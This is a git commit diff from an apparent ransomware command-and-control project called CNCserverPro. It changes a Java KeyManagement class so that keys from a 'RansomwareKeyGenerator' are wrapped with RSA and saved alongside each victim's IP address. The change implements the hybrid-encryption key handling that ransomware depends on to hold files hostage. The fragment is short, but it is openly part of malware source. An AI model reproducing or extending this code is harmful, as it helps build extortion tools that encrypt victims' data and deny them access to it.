7b544b61039fdc5aeb635d2e2a56371a3d1c960d
Admin <Admin@Admin-PC>
2020-06-05 19:45:48 +0300

    Encrypt the symmetric key with a public key, using a asymmetric algorithm-RSA

--- CNCserverPro/src/main/java/app/keys/KeyManagement.java
+++ CNCserverPro/src/main/java/app/keys/KeyManagement.java
@@ -6,15 +6,17 @@ import app.exceptions.InvalidCryptoKeyException;
 
 public class KeyManagement implements Management {
 	private RansomwareKeyGenerator generator;
+	private AsymetricKeyWrapper wrapper;
 
 	public KeyManagement() {
 		generator = new RansomwareKeyGenerator();
+		wrapper = new AsymetricKeyWrapper();
 	}
 
 	@Override
 	public CryptoKey createAndSaveKey(String encalgo, String ip) throws InvalidCryptoKeyException {
 		try {
-			return new CryptoKey(ip, generator.generateKey(encalgo), encalgo);
+			return new CryptoKey(ip, wrapper.wrapKey(generator.generateKey(encalgo), encalgo), encalgo);
 		} catch (AlgorithmNotFoundException e) {
 			throw new InvalidCryptoKeyException("Key requierments- algoritm not found", e);
 		}
